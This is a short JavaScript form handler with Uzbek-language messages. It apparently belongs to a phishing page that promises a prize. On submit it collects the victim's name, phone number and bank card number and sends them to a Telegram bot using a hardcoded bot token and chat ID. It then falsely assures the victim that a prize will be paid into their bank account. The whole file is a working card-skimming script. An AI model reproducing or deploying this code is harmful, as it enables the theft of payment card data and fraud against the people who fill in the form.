
const chatId = "6276000412";
const telegramBotId ="7844524159:AAEL2t7_bNQs6VLcBMw7Av103NBSJ_THzUQ"; 
const url = "https://api.telegram.org/bot" + telegramBotId + "/sendMessage";

// So'rov yuborish
const sendRequest = (e) => {
  e.preventDefault();

  const firstName = document.querySelector(".js-first-name").value.trim();
  const  number = document.querySelector(".js-age").value.trim();
  const card = document.querySelector(".js-card").value.trim()

  const message = `ism: ${firstName}\ntelefon : ${number}\nkarta: ${card}`;

  const formData = {
    chat_id: chatId,
    text: message,
  };

  axios
    .post(url, formData)
    .then(() => {
      alert("so'vrin sizning bank xisobingizga tashlab beriladi");
    })
    .catch(() => {
      alert("Ma'lumotlarni xato kiritdingiz qaytadan urunib ko'ring");
    });

  // Formani tozalash
  document.querySelector(".js-first-name").value = "";
  document.querySelector(".js-age").value = "";
  document.querySelector(".js-card").value = "";

};

document.querySelector(".js-register-form").addEventListener("submit", sendRequest);
